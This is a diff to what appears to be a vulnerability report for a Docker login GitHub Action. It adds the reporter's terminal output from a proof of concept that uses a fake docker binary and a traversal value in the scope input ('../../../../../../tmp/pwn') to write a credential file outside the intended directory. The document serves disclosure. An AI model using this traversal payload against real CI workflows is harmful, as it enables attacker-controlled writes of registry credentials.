@@ -80,8 +80,6 @@ cd login-action
 
 ### 2. Create a fake docker binary
 
-(No real credentials or daemon required)
-
 ```bash
 mkdir -p /tmp/pocbin /tmp/login-poc
 
@@ -141,6 +139,57 @@ Credential file written outside intended directory:
 ```
 
 This confirms attacker-controlled file write via scope traversal.
+
+
+My terminal output:
+
+```bash
+┌──(keshav㉿kali)-[~/Downloads/login-action]
+└─$ mkdir -p /tmp/pocbin /tmp/login-poc
+cat > /tmp/pocbin/docker <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+cmd="$1"; shift || true
+printf 'cmd=%s DOCKER_CONFIG=%s args=%s\n' "$cmd" "${DOCKER_CONFIG:-}" "$*" >> /tmp/login-poc/invocations.log
+if [ "$cmd" = "login" ]; then
+  cat >/dev/null || true
+  mkdir -p "${DOCKER_CONFIG}"
+  echo '{"auths":{"example":{"auth":"dGVzdDp0ZXN0"}}}' > "${DOCKER_CONFIG}/config.json"
+fi
+exit 0
+EOF
+chmod +x /tmp/pocbin/docker
+
+                                                                                
+┌──(keshav㉿kali)-[~/Downloads/login-action]
+└─$ PATH="/tmp/pocbin:$PATH" \
+RUNNER_TEMP="/tmp/runner" \
+INPUT_USERNAME="test" \
+INPUT_PASSWORD="test" \
+INPUT_SCOPE='../../../../../../tmp/pwn' \
+INPUT_LOGOUT='false' \
+node dist/index.js
+
+::save-state name=isPost::true
+::save-state name=logout::false
+::save-state name=registries::[{"registry":"docker.io","configDir":"/tmp/pwn"}]
+Logging into docker.io (scope ../../../../../../tmp/pwn)...
+::debug::Exec.getExecOutput: docker login --password-stdin --username test docker.io
+Login Succeeded!
+                                                                                
+┌──(keshav㉿kali)-[~/Downloads/login-action]
+└─$ cat /tmp/login-poc/invocations.log
+ls -la /tmp/pwn
+cat /tmp/pwn/config.json
+
+cmd=login DOCKER_CONFIG=/tmp/pwn args=--password-stdin --username test docker.io
+total 4
+drwxrwxr-x  2 keshav keshav  60 Feb 18 20:46 .
+drwxrwxrwt 18 root   root   460 Feb 18 20:46 ..
+-rw-rw-r--  1 keshav keshav  46 Feb 18 20:46 config.json
+{"auths":{"example":{"auth":"dGVzdDp0ZXN0"}}}
+
+```
 
 ## Security Impact Classification
 
